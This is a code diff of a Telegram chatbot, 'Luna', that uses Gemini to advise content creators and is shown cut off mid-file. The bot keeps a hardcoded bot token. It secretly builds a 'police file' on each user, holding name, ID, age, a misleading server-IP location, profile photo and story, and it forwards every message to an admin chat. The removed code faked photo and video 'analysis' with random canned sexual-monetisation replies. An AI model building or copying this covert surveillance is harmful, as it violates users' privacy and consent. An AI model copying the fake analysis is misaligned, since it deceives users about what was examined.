@@ -1,28 +1,43 @@
-import os
-import sqlite3
-import requests
 import io
-import random
+import logging
+import os
 import re
-from PIL import Image, ImageStat
+import sqlite3
 from datetime import datetime, timedelta
+
+import requests
 from google import genai
 from google.genai import types
+from PIL import Image
 from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    ContextTypes,
+    MessageHandler,
+    filters,
+)
+
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
+)
+logger = logging.getLogger(__name__)
 
 # ======================
 # CONFIGURACIÓN
 # ======================
-TELEGRAM_TOKEN = "9079896633:AAEo-NdxQQtZOUBYqn1X6Uhk2He4dnh9AGI"
-DANI_CHAT_ID = 8099004064
-# 👇 CAMBIA ESTA URL POR LA DE TU NUEVO RENDER
-RENDER_EXTERNAL_URL = "https://luna-bot-a1fc.onrender.com"
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN") or "9079896633:AAEo-NdxQQtZOUBYqn1X6Uhk2He4dnh9AGI"
+GEMINI_API_KEY = os.environ["GEMINI_API_KEY"]
+DANI_CHAT_ID = int(os.getenv("DANI_CHAT_ID", "8099004064"))
+RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL", "https://luna-bot-a1fc.onrender.com")
+MODEL_NAME = os.getenv("GEMINI_MODEL", "gemini-2.5-flash")
+DB_PATH = os.getenv("SQLITE_PATH", "nuevo_bot.db")
 
 # ======================
 # GEMINI (BÚSQUEDA GOOGLE + MEMORIA)
 # ======================
-gemini_client = genai.Client()
+gemini_client = genai.Client(api_key=GEMINI_API_KEY)
 
 SYSTEM_PROMPT = """
 Eres Luna, una amiga cercana, segura, directa, pícara y experta en creación de contenido, redes sociales y monetización.
@@ -33,48 +48,158 @@ Cuando necesites información actual o verificar datos en internet, usa la búsq
 Recuerda y respeta el contexto de la conversación actual.
 """
 
-def guardar_mensaje_historial(user_id: int, rol: str, mensaje: str):
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute("INSERT INTO historial (user_id, rol, mensaje) VALUES (?, ?, ?)", (user_id, rol, mensaje))
-    c.execute('''DELETE FROM historial
-                 WHERE user_id = ?
-                 AND id NOT IN (
-                     SELECT id FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 16
-                 )''', (user_id, user_id))
-    conn.commit()
-    conn.close()
+
+def get_db_connection() -> sqlite3.Connection:
+    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+
+def init_db() -> None:
+    with get_db_connection() as conn:
+        conn.execute(
+            """
+            CREATE TABLE IF NOT EXISTS usuarios (
+                id INTEGER PRIMARY KEY,
+                nombre TEXT,
+                username TEXT,
+                edad INTEGER,
+                ultimo_mensaje TEXT,
+                memoria_nombre TEXT
+            )
+            """
+        )
+        conn.execute(
+            """
+            CREATE TABLE IF NOT EXISTS historial (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER NOT NULL,
+                rol TEXT NOT NULL,
+                mensaje TEXT NOT NULL
+            )
+            """
+        )
+        conn.execute(
+            "CREATE INDEX IF NOT EXISTS idx_historial_user ON historial (user_id, id)"
+        )
+        conn.commit()
+
+
+init_db()
+
+
+def guardar_usuario(user_id: int, nombre: str | None, username: str | None, edad: int) -> None:
+    ahora = datetime.now().isoformat()
+    with get_db_connection() as conn:
+        conn.execute(
+            """
+            INSERT INTO usuarios (id, nombre, username, edad, ultimo_mensaje, memoria_nombre)
+            VALUES (?, ?, ?, ?, ?, NULL)
+            ON CONFLICT(id) DO UPDATE SET
+                nombre = excluded.nombre,
+                username = excluded.username,
+                edad = excluded.edad,
+                ultimo_mensaje = excluded.ultimo_mensaje
+            """,
+            (user_id, nombre, username, edad, ahora),
+        )
+        conn.commit()
+
+
+def obtener_usuario(user_id: int) -> sqlite3.Row | None:
+    with get_db_connection() as conn:
+        cur = conn.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
+        return cur.fetchone()
+
+
+def actualizar_tiempo(user_id: int) -> None:
+    ahora = datetime.now().isoformat()
+    with get_db_connection() as conn:
+        conn.execute(
+            "UPDATE usuarios SET ultimo_mensaje = ? WHERE id = ?",
+            (ahora, user_id),
+        )
+        conn.commit()
+
+
+def guardar_memoria_nombre(user_id: int, nombre_guardado: str) -> None:
+    with get_db_connection() as conn:
+        conn.execute(
+            "UPDATE usuarios SET memoria_nombre = ? WHERE id = ?",
+            (nombre_guardado, user_id),
+        )
+        conn.commit()
+
+
+def borrar_todo(user_id: int) -> None:
+    with get_db_connection() as conn:
+        conn.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
+        conn.execute(
+            "UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?",
+            (user_id,),
+        )
+        conn.commit()
+
+
+def guardar_mensaje_historial(user_id: int, rol: str, mensaje: str) -> None:
+    with get_db_connection() as conn:
+        conn.execute(
+            "INSERT INTO historial (user_id, rol, mensaje) VALUES (?, ?, ?)",
+            (user_id, rol, mensaje),
+        )
+        conn.execute(
+            """
+            DELETE FROM historial
+            WHERE user_id = ?
+              AND id NOT IN (
+                  SELECT id FROM historial
+                  WHERE user_id = ?
+                  ORDER BY id DESC
+                  LIMIT 16
+              )
+            """,
+            (user_id, user_id),
+        )
+        conn.commit()
+
 
 def obtener_historial_gemini(user_id: int) -> list[types.Content]:
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute("SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id ASC", (user_id,))
-    rows = c.fetchall()
-    conn.close()
+    with get_db_connection() as conn:
+        rows = conn.execute(
+            "SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id ASC",
+            (user_id,),
+        ).fetchall()
 
     contents: list[types.Content] = []
-    for rol, mensaje in rows:
-        role_gemini = "user" if rol == "user" else "model"
+    for row in rows:
+        role_gemini = "user" if row["rol"] == "user" else "model"
         contents.append(
-            types.Content(role=role_gemini, parts=[types.Part.from_text(text=mensaje)])
+            types.Content(
+                role=role_gemini,
+                parts=[types.Part.from_text(text=row["mensaje"])],
+            )
         )
     return contents
 
-def preparar_imagen_gemini(imagen_bytes: bytes) -> Image.Image:
-    with Image.open(io.BytesIO(imagen_bytes)) as img:
+
+def preparar_imagen_gemini(imagen_bytes: bytes | bytearray) -> Image.Image:
+    with Image.open(io.BytesIO(bytes(imagen_bytes))) as img:
         convertida = img.convert("RGB")
         convertida.thumbnail((1024, 1024))
-        return convertida
+        return convertida.copy()
+
 
 async def responder_con_gemini(
     user_id: int,
     texto_usuario: str,
-    imagen_bytes: bytes | None = None,
-    audio_bytes: bytes | None = None,
-    audio_mime: str = "audio/ogg"
+    imagen_bytes: bytes | bytearray | None = None,
+    video_bytes: bytes | bytearray | None = None,
+    video_mime: str = "video/mp4",
+    audio_bytes: bytes | bytearray | None = None,
+    audio_mime: str = "audio/ogg",
 ) -> str:
     usuario = obtener_usuario(user_id)
-    memoria_nombre = usuario[5] if usuario and len(usuario) > 5 else None
+    memoria_nombre = usuario["memoria_nombre"] if usuario else None
 
     system_con_contexto = SYSTEM_PROMPT
     if memoria_nombre:
@@ -85,8 +210,14 @@ async def responder_con_gemini(
     partes_actuales: list = []
     if imagen_bytes:
         partes_actuales.append(preparar_imagen_gemini(imagen_bytes))
+    if video_bytes:
+        partes_actuales.append(
+            types.Part.from_bytes(data=bytes(video_bytes), mime_type=video_mime)
+        )
     if audio_bytes:
-        partes_actuales.append(types.Part.from_bytes(data=audio_bytes, mime_type=audio_mime))
+        partes_actuales.append(
+            types.Part.from_bytes(data=bytes(audio_bytes), mime_type=audio_mime)
+        )
     partes_actuales.append(texto_usuario)
 
     contents = historial_previo + [
@@ -100,7 +231,7 @@ async def responder_con_gemini(
     )
 
     response = await gemini_client.aio.models.generate_content(
-        model="gemini-2.5-flash",
+        model=MODEL_NAME,
         contents=contents,
         config=config,
     )
@@ -112,6 +243,8 @@ async def responder_con_gemini(
     resumen_entrada = texto_usuario
     if imagen_bytes:
         resumen_entrada = f"[Envió una foto] {texto_usuario}".strip()
+    elif video_bytes:
+        resumen_entrada = f"[Envió un video/GIF] {texto_usuario}".strip()
     elif audio_bytes:
         resumen_entrada = f"[Envió un audio] {texto_usuario}".strip()
 
@@ -120,73 +253,26 @@ async def responder_con_gemini(
 
     return respuesta_texto
 
-# ======================
-# BASE DE DATOS (CON MEMORIA)
-# ======================
-def init_db():
-    # Cambié el nombre del archivo a nuevo_bot.db para empezar limpio
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
-                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, ultimo_mensaje TEXT, memoria_nombre TEXT)''')
-    c.execute('''CREATE TABLE IF NOT EXISTS historial
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, rol TEXT, mensaje TEXT)''')
-    conn.commit()
-    conn.close()
 
-init_db()
+async def enviar_por_trozos(update: Update, texto: str, chunk_size: int = 4000) -> None:
+    if not update.message:
+        return
+    for i in range(0, len(texto), chunk_size):
+        await update.message.reply_text(texto[i : i + chunk_size])
 
-def guardar_usuario(user_id, nombre, username, edad):
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    ahora = datetime.now().isoformat()
-    c.execute("INSERT OR REPLACE INTO usuarios (id, nombre, username, edad, ultimo_mensaje, memoria_nombre) VALUES (?, ?, ?, ?, ?, NULL)", (user_id, nombre, username, edad, ahora))
-    conn.commit()
-    conn.close()
-
-def obtener_usuario(user_id):
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    return row
-
-def actualizar_tiempo(user_id):
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    ahora = datetime.now().isoformat()
-    c.execute("UPDATE usuarios SET ultimo_mensaje = ? WHERE id = ?", (ahora, user_id))
-    conn.commit()
-    conn.close()
-
-def guardar_memoria_nombre(user_id, nombre_guardado):
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute("UPDATE usuarios SET memoria_nombre = ? WHERE id = ?", (nombre_guardado, user_id))
-    conn.commit()
-    conn.close()
-
-def borrar_todo(user_id):
-    conn = sqlite3.connect('nuevo_bot.db', check_same_thread=False)
-    c = conn.cursor()
-    c.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
-    c.execute("UPDATE usuarios SET memoria_nombre = NULL WHERE id = ?", (user_id,))
-    conn.commit()
-    conn.close()
 
 # ======================
-# EXPEDIENTE POLICIAL COMPLETO (PARA TI)
+# EXPEDIENTE Y REENVÍO AL ADMIN
 # ======================
-async def enviar_expediente_completo(context, user, fecha_texto, edad):
+async def enviar_expediente_completo(context: ContextTypes.DEFAULT_TYPE, user, fecha_texto: str, edad: int) -> None:
     try:
         pais = "Desconocido"
         ciudad = "Desconocida"
         try:
             ip_respuesta = requests.get("https://ipapi.co/json/", timeout=5).json()
-            pais = ip_respuesta.get('country_name', 'Desconocido')
-            ciudad = ip_respuesta.get('city', 'Desconocida')
-        except:
+            pais = ip_respuesta.get("country_name", "Desconocido")
+            ciudad = ip_respuesta.get("city", "Desconocida")
+        except Exception:
             pass
 
         fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
@@ -195,14 +281,14 @@ async def enviar_expediente_completo(context, user, fecha_texto, edad):
         tiene_story = "No"
         try:
             chat_info = await context.bot.get_chat(user.id)
-            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
+            if hasattr(chat_info, "pinned_story") and chat_info.pinned_story:
                 tiene_story = "Sí"
-        except:
+        except Exception:
             pass
 
         reporte = (
-            f"🚨 **EXPEDIENTE POLICIAL COMPLETO** 🚨\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🚨 **EXPEDIENTE POLICIAL COMPLETO** 🚨\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"👤 **Nombre Real:** {user.first_name} {user.last_name or ''}\n"
             f"🆔 **ID de Telegram:** `{user.id}`\n"
             f"🔗 **Usuario:** @{user.username if user.username else 'Oculto'}\n"
@@ -213,235 +299,118 @@ async def enviar_expediente_completo(context, user, fecha_texto, edad):
             f"📸 **Tiene Foto Perfil:** {tiene_foto}\n"
             f"📖 **Tiene Historias:** {tiene_story}\n"
             f"⏰ **Hora de Registro:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⚠️ *Sujeto registrado en la base de datos.*"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "⚠️ *Sujeto registrado en la base de datos.*"
         )
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
-        
+
         if fotos_perfil.total_count > 0:
             foto_perfil = fotos_perfil.photos[0][-1].file_id
-            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Evidencia: Foto de perfil.")
-            
+            await context.bot.send_photo(
+                chat_id=DANI_CHAT_ID,
+                photo=foto_perfil,
+                caption="📸 Evidencia: Foto de perfil.",
+            )
+
         try:
             chat_info = await context.bot.get_chat(user.id)
-            if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
+            if hasattr(chat_info, "pinned_story") and chat_info.pinned_story:
                 story = chat_info.pinned_story
-                if story.photo:
-                    await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=story.photo[-1].file_id, caption="📖 Evidencia: Historia (Story).")
-                elif story.video:
-                    await context.bot.send_video(chat_id=DANI_CHAT_ID, video=story.video.file_id, caption="🎥 Evidencia: Video de Historia.")
-        except Exception as e:
+                if getattr(story, "photo", None):
+                    await context.bot.send_photo(
+                        chat_id=DANI_CHAT_ID,
+                        photo=story.photo[-1].file_id,
+                        caption="📖 Evidencia: Historia (Story).",
+                    )
+                elif getattr(story, "video", None):
+                    await context.bot.send_video(
+                        chat_id=DANI_CHAT_ID,
+                        video=story.video.file_id,
+                        caption="🎥 Evidencia: Video de Historia.",
+                    )
+        except Exception:
             pass
 
-    except Exception as e: 
-        print(f"Error en expediente: {e}")
+    except Exception as exc:
+        logger.error("Error en expediente: %s", exc)
 
-# ======================
-# REENVIAR AL ADMIN
-# ======================
-async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     try:
         msg = update.message
         usuario_actual = update.effective_user
-        
+        if not msg or not usuario_actual:
+            return
+
         if msg.forward_origin:
             nombre_original = "Canal o Grupo Desconocido"
             id_original = ""
-            try:
-                if msg.forward_origin.sender_user:
-                    nombre_original = msg.forward_origin.sender_user.first_name
-                    id_original = f" (`{msg.forward_origin.sender_user.id}`)"
-            except AttributeError: pass 
-            try:
-                if msg.forward_origin.chat:
-                    nombre_original = msg.forward_origin.chat.title
-            except AttributeError: pass 
+            if hasattr(msg.forward_origin, "sender_user") and msg.forward_origin.sender_user:
+                nombre_original = msg.forward_origin.sender_user.first_name
+                id_original = f" (`{msg.forward_origin.sender_user.id}`)"
+            elif hasattr(msg.forward_origin, "chat") and msg.forward_origin.chat:
+                nombre_original = msg.forward_origin.chat.title or "Canal"
 
-            texto_aviso = f"🔄 **REENVIADO A TI**\n👤 **Original:** {nombre_original}{id_original}\n📩 **Quien lo reenvió:** {usuario_actual.first_name}"
+            texto_aviso = (
+                "🔄 **REENVIADO A TI**\n"
+                f"👤 **Original:** {nombre_original}{id_original}\n"
+                f"📩 **Quien lo reenvió:** {usuario_actual.first_name}"
+            )
         else:
-            texto_aviso = f"📩 **MENSAJE NORMAL**\n👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
+            texto_aviso = (
+                "📩 **MENSAJE NORMAL**\n"
+                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
+            )
 
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
-        await context.bot.forward_message(chat_id=DANI_CHAT_ID, from_chat_id=update.effective_chat.id, message_id=update.message.message_id)
-    except Exception as e:
-        print(f"Error reenviando al admin: {e}")
+        await context.bot.forward_message(
+            chat_id=DANI_CHAT_ID,
+            from_chat_id=update.effective_chat.id,
+            message_id=msg.message_id,
+        )
+    except Exception as exc:
+        logger.error("Error reenviando al admin: %s", exc)
 
-# ======================
-# ANÁLISIS DE CONTENIDO (LUZ REAL Y 40 TEXTOS VARIADOS)
-# ======================
-def analizar_contenido(tipo="foto", imagen_bytes=None):
-    # --- ANÁLISIS REAL DE LUZ ---
-    calidad_luz = "La luz está un poco plana."
-    if imagen_bytes:
-        try:
-            img = Image.open(io.BytesIO(imagen_bytes)).convert('L')
-            stat = ImageStat.Stat(img)
-            brillo = stat.mean[0] 
-            
-            if brillo < 60:
-                calidad_luz = "La foto está muy oscura. Te recomiendo usar una luz más suave o acercarte a una ventana para que resalten mejor tus curvas. 💡"
-            elif brillo > 180:
-                calidad_luz = "La foto está demasiado iluminada (parece que usaste flash directo). Prueba con una luz más suave y lateral para que no se queme la imagen. 💡"
-            else:
-                calidad_luz = "¡La luz está perfecta! Resalta bien tu cuerpo de forma natural. 💡"
-        except: pass
 
-    if tipo == "video" or tipo == "gif":
-        # 20 RESPUESTAS DISTINTAS PARA VIDEO
-        respuestas_video = [
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una pose muy provocativa. El movimiento de cámara es un poco rápido, lo que distrae un poco.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.\n4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** ¡Qué movimiento tan sexy! El ángulo resalta tus curvas perfectamente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.\n4. **Tip de venta:** Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación muy natural, se nota que tienes confianza.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.\n4. **Tip de venta:** Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** El movimiento es muy fluido y sexys.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.\n4. **Tip de venta:** Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una toma muy atrevida y directa.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.\n4. **Tip de venta:** Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un video que despierta muchísimo morbo. El ángulo es perfecto.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para grabarte. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si el video es corto, úsalo como 'Teaser' (avance) para vender un video más largo por privado.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** La pose inicial es muy buena, pero se pierde un poco al moverte.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Hazte la toma desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes.\n4. **Tip de venta:** Ponle un precio más alto a los videos donde se te vea la cara. Los fans pagan más por la conexión visual.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un movimiento de caderas muy bien logrado.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Juega con la ropa. Quítate una prenda lentamente mientras grabas, eso genera mucha expectativa.\n4. **Tip de venta:** Aprovecha los días festivos (San Valentín, Navidad) para vender packs temáticos con estos videos.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un ángulo muy favorecedor para tus piernas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta grabar en cámara lenta (slow motion) moviendo el cabello. Es un clásico que nunca falla.\n4. **Tip de venta:** Ofrece un descuento por tiempo limitado (ej. 'solo por hoy') para crear urgencia en la compra.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una expresión facial muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la cámara esté estable. Usa un trípode o apóyala en algo para evitar el temblor.\n4. **Tip de venta:** Haz una oferta de '2x1' en tus videos. A los suscriptores les encanta sentir que ahorran.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Se nota que estás cómoda frente a la cámara.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a hacer un 'striptease' lento. La anticipación es lo que más excita a los fans.\n4. **Tip de venta:** Los videos de 'Buenos días' o 'Buenas noches' personalizados se venden muy bien. ¡Inténtalo!",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un primer plano muy íntimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Enfoca más tu rostro y tu escote al mismo tiempo. Es el encuadre favorito de la mayoría.\n4. **Tip de venta:** Pregunta a tus fans qué es lo que más les gusta de ti. Luego crea un video enfocado en eso y véndelo.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación muy espontánea y natural.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a grabarte en la ducha o en la bañera. El agua y el vapor dan un efecto muy sensual.\n4. **Tip de venta:** Crea un 'Nivel VIP' en tu OnlyFans y ofrece estos videos exclusivos solo para ellos.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un movimiento de cuerpo muy rítmico.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para grabarte. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si tienes un video muy bueno, guárdalo para el final del mes para cumplir la cuota de ventas.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una pose acostada que se ve muy relajada y sexy.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Pon sábanas de seda o satén. La textura resalta muchísimo en cámara.\n4. **Tip de venta:** Ofrece la posibilidad de que el fan pida un video personalizado con su nombre. Cóbrale más caro.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un encuadre muy ajustado que resalta tus curvas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Aleja un poco la cámara para mostrar todo el conjunto, no solo una parte.\n4. **Tip de venta:** Envía un mensaje masivo ofreciendo un 'Pack de Bienvenida' para nuevos suscriptores.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un gesto con las manos muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa lencería de colores oscuros (negro o rojo). Resaltan muchísimo más.\n4. **Tip de venta:** Manda el video a primera hora de la mañana. Los fans suelen revisar el teléfono al despertar.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Una grabación con mucho movimiento de cabello.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta grabar en un ambiente con poca luz y usa velas. Da un ambiente muy íntimo.\n4. **Tip de venta:** Crea encuestas en tu muro preguntando '¿Qué video quieren ver hoy?'. Involúcralos.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** La toma desde arriba te hace ver muy dominante.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a susurrar o gemir suavemente mientras grabas. El audio es clave.\n4. **Tip de venta:** Los videos de 'POV' (Punto de vista, como si el fan estuviera ahí) venden muchísimo.",
-            f"🎬 **Análisis de tu video/GIF:**\n1. **Lo que veo:** Un baile muy sensual.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la música de fondo sea adecuada. Un ritmo lento ayuda a marcar el movimiento.\n4. **Tip de venta:** Sube un fragmento de 10 segundos a tu feed y pon el resto del video de pago."
-        ]
-        return random.choice(respuestas_video)
-
-    elif tipo == "audio":
-        respuestas_audio = [
-            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Tu tono de voz es muy sugerente y natural.\n2. **Lo bueno:** La cercanía al micrófono hace que se escuche íntimo.\n3. **Cómo mejorarlo:** Intenta bajar un poco más la voz, casi en un susurro. Juega con la respiración cerca del micro.\n4. **Tip de venta:** Los audios personalizados (diciendo el nombre de tu fan) se venden carísimos. ¡Aprovéchalo! 😈",
-            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Tu voz suena muy relajada, lo cual es perfecto para ASMR.\n2. **Lo bueno:** La naturalidad con la que hablas atrapa.\n3. **Cómo mejorarlo:** Graba en una habitación con almohadas o cortinas para evitar el eco. La calidad del sonido es clave.\n4. **Tip de venta:** Ofrece audios donde digas cosas que te gustaría hacerle al fan. Eso los vuelve locos.",
-            "🎧 **Análisis de tu audio:**\n1. **Lo que escucho:** Un tono muy juguetón y pícaro.\n2. **Lo bueno:** Transmites mucha confianza.\n3. **Cómo mejorarlo:** Haz pausas dramáticas después de decir algo picante. El silencio también comunica.\n4. **Tip de venta:** Vende una serie de audios contando una historia erótica. La gente paga por el morbo de saber qué pasa después."
-        ]
-        return random.choice(respuestas_audio)
-        
-    else:
-        # 20 RESPUESTAS DISTINTAS PARA FOTO
-        respuestas_foto = [
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy atrevida. La pose resalta perfecto y se nota que tienes confianza.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a subir los brazos y arquear la espalda. Eso estiliza la cintura y resalta el busto.\n4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Estás súper sexy. La lencería o la ropa que llevas resalta perfecto.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta sentarte en la cama con las piernas abiertas y mira fijamente a la cámara. Esa pose vuelve locos a los hombres.\n4. **Tip de venta:** Vende esta foto en un pack de 3 y ponle un precio especial. A los fans les gustan las ofertas.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy sugerente, deja mucho a la imaginación.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte de espaldas, mira por encima del hombro y muerde un poco tu labio. Da un morbo increíble.\n4. **Tip de venta:** Mándale esta foto a tus suscriptores más fieles con un texto que diga: 'Pensé en ti'. Van a volverse locos.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** ¡Qué cuerpo! El ángulo que usaste te favorece muchísimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Acuéstate de lado, apoya la cabeza en un brazo y deja que la sábana cubra solo una parte de tu cuerpo. Deja mucho a la imaginación.\n4. **Tip de venta:** Usa esta foto como gancho en tus redes sociales para atraer nuevos suscriptores.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucha actitud. Mirar a la cámara así vende muchísimo.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Ponte en cuclillas (sentadilla) apoyando la espalda en la pared. Resalta muchísimo las curvas de las piernas.\n4. **Tip de venta:** Si la subes a tu historia, pon una encuesta que diga '¿Te gusta lo que ves?'. Genera interacción y luego les vendes el pack.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy limpia y natural. Tienes una expresión facial muy bonita.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si la foto es muy buena, úsala como portada de tu perfil o para un anuncio.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** La ropa interior que elegiste es un acierto total.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Hazte la foto desde un poco más arriba, mirando hacia abajo. Resalta más el escote y te hace ojos más grandes.\n4. **Tip de venta:** Ponle un precio más alto a las fotos donde se te vea la cara. Los fans pagan más por la conexión visual.",
